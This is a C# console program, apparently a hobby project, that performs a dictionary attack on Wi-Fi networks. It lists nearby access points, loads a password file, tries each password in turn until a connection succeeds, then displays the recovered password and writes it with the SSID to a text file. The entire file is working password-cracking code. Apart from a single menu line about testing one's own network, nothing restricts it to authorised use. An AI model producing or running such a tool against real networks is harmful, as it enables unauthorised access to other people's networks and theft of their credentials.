using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using SimpleWifi;
using SimpleWifi.Win32;
using SimpleWifi.Win32.Interop;

namespace Wificracker
{
    class Program
    {
        public static Wifi wifi;
         // connect to wifi method
         public static bool connectToWifi(AccessPoint ap, string password)
        {
            AuthRequest authRequest = new AuthRequest(ap);
            authRequest.Password = password;
            return ap.Connect(authRequest);
        }
        // change text color method
        public static void Colorchange(string x)
        {
            Console.BackgroundColor = ConsoleColor.Green;
            Console.ForegroundColor = ConsoleColor.Black;
            Console.Write(x);
            Console.ForegroundColor = ConsoleColor.White;
            Console.BackgroundColor = ConsoleColor.Black;
        }
        // change text color method
        public static void Colorchangefail(string x)
        {
            Console.BackgroundColor = ConsoleColor.Red;
            Console.ForegroundColor = ConsoleColor.Black;
            Console.Write(x);
            Console.ForegroundColor = ConsoleColor.White;
            Console.BackgroundColor = ConsoleColor.Black;
        }
        //return method
        public static void Gomenu()
        {
            Console.WriteLine("\n\nPress any key to return to the main menu...");
            Console.ReadKey();
        }

        static void Main(string[] args)
        {
            List<string> passdictionary = new List<string>(); //declaration of list for passwords
            char menuchoise;
            int netchoise = -1;
            wifi = new Wifi();
            List<AccessPoint> aps = wifi.GetAccessPoints(); //declaration of list of access points
            do
            {
                bool isEmpty = passdictionary.Any(); //checking the filling of the list
                Console.Clear();
                Console.WriteLine("Wifi cracker 1.0");
                Console.WriteLine(new string('-', 20));
                Console.Write("1. Load dictionary\t\t\t");
                if (isEmpty) 
                {
                    Colorchange("The dictionary loaded");                    
                }
                else
                {
                    Console.Write("The dictionary does not load yet or does not contain any data");
                }
                if (netchoise == -1) //checking of SSID select
                { 
                Console.Write("\n2. Search and select Wifi network" + "\tNo network selected");
                }
                else
                {
                    Console.Write("\n2. Search and select Wifi network\t");
                    Colorchange("selected:" + aps[netchoise].Name);
                }
                Console.Write("\n3. Perform a dictionary attack\t\t");
                if (isEmpty && netchoise != -1)
                {
                    Colorchange("You can do it!");
                }
                    Console.WriteLine("\n4. End");
                Console.WriteLine("\n\n\nIf you want to test your own Wifi network, you have to disconnect from your Wifi and delete the stored password (or whole profile).");
                menuchoise = char.ToLower(Console.ReadKey().KeyChar);
                switch (menuchoise) //menu
                {
                    case '1':     //loading of dictionary
                       Console.Clear();
                       Console.WriteLine(@"Enter the full path to the dictionary eg: C:\Users\user\dictionary.txt");
                        string nazevslovniku = Console.ReadLine();
                        try {           //exception                 
                            using (StreamReader sr = new StreamReader(nazevslovniku))
                            {
                                while (!(sr.EndOfStream))
                                {
                                    passdictionary.Add(sr.ReadLine()); //loading data into list
                                }
                            }                          
                            Colorchange("dictionary loaded successfully");
                             
                        }
                        catch
                        {
                            
                            Colorchangefail("You entered the wrong path");
                            
                        }
       
                        Gomenu();
                        break;

                    case '2': //searching SSIDs (Wifi networks)
                        Console.Clear();
                        int i = 0;
                        foreach (AccessPoint ap in aps) //listing in list
                        {
                            
                            Console.Write(i+" ");
                            Console.WriteLine(ap.Name);
                            i++;
                        }
                         
                        
                        Console.WriteLine(new string('-', 40)); //choosing of network
                            Console.Write("number of network: ");
                        try //exception
                        {
                            netchoise = Convert.ToInt32(Console.ReadLine());
                        }
                        catch
                        {
                            Console.WriteLine("\n You entered an incorrect value");
                        }
                        if(netchoise >= 0 && netchoise < aps.Count) 
                        { 
                            Console.WriteLine("\nYou have selected a network: " + aps[netchoise].Name);
                        }
                        else if (netchoise < 0 || netchoise >= aps.Count)
                        {
                            Colorchangefail("\n You entered an incorrect value");
                            netchoise = -1;
                        }
                        Gomenu();
                        
                        
                        break;

                    case '3': //dictionary attack
                     
                        if (isEmpty && netchoise !=-1)
                        {
                            int x = 0;
                            Console.Clear();
                            wifi.Disconnect();
                            Console.WriteLine("Finding password of: " + aps[netchoise].Name + " in progress...");
                            AccessPoint apg = aps[netchoise];
                                
                            while (!connectToWifi(apg, passdictionary[x])) //calling of connection to SSID
                            {
                                if (x < passdictionary.Count - 1)
                                {
                                    wifi.Disconnect();
                                    x++;
                                }      

                                 else
                                 {
                                    break;
                                 }
                            }
                            if (connectToWifi(apg, passdictionary[x])) //results of attack
                            {
                                Console.Write("Wifi password into network: " + aps[netchoise].Name + " is: ");
                                Colorchange(passdictionary[x]);
                                using (StreamWriter sw = new StreamWriter(aps[netchoise].Name + "_password.txt"))
                                {
                                    sw.WriteLine(DateTime.Now + "; SSID: " + aps[netchoise].Name + "; password: " + passdictionary[x]);
                                    sw.Flush();
                                    Console.WriteLine("\n\n\nThe password was saved into the file: " + aps[netchoise].Name + "_password.txt");
                                }
                                
                                Gomenu();
                            
                            }
                            else
                                {
                                Console.WriteLine("Password not found");
                                Gomenu();
                               

                            }
                           
                        }
                        else
                        {
                            Console.Clear();
                            Console.WriteLine("You haven't a dictionary or Wifi network selected.");
                            Gomenu();
                           
                        }
                      
                        break; 

                    case '4': //end of app
                        Console.Clear();
                        Console.WriteLine("Press any key to exit...");
                        break;

                
                }
                

            } while (menuchoise != '4');
            Console.ReadKey();
            
        }
    }
}
